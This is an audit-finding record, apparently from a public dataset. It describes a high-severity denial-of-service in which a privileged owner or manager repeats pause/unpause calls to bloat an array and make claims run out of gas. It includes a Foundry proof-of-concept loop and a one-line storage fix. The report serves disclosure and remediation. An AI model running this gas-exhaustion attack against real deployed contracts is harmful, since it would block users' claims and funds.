# [H] Malicious owner or manager may DoS the Set

## Summary
Severity: High
Contest weight: 0.3923
Dataset id: 5019
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Each pair of pause/unpause calls extends the inactivityData.periods array. When reading from this array the protocol aims to mitigate the potential for excessive gas consumption by making use of cumulativeDuration duration and performing a binary search when recovering relevant values.
There is, however, a statement which inadvertently loads the entire array into memory before performing the binary search. By performing an excessive number of pause/unpause calls, a malicious owner or manager may cause claims to DoS:
```solidity
// NOTE: Foundry test, reads are warm. Actual attack cost is lower.
function test_pauseDoS() public {
    (address depositorA, address buyerA,) = initializeAccounts(200 ether);
    // Deposit 100 ETH into the set.
    depositWithPrank(depositorA, 100 ether);
    // Buy 100 ETH worth of pTokens.
    purchaseWithPrank(0, buyerA, 100 ether);
    skipDepositDuration();
    skipPurchaseDelay();
    // Pause the set.
    for (uint256 i = 0; i < 45000; i++) {
        vm.prank(pauser);
        set.pause();
        skip(12);
        SetState setState = set.setState();
        vm.prank(owner);
        set.unpause();
    }
    uint256 checkpointGasLeft = gasleft();
    triggerMarket(0);
    console2.log("Gas used: %s", checkpointGasLeft - gasleft());
    checkpointGasLeft = gasleft();
    claimMax(buyerA, 0);
    console2.log("Gas used: %s", checkpointGasLeft - gasleft());
}
```

## Recommendation
Avoid loading the array into memory:
```solidity
function balanceOfMatured(address user_) public view override returns (uint256 balance_) {
...snip...
- InactivityData memory inactivityData_ = inactivityData;
+ InactivityData storage inactivityData_ = inactivityData;
...snip...
}
```
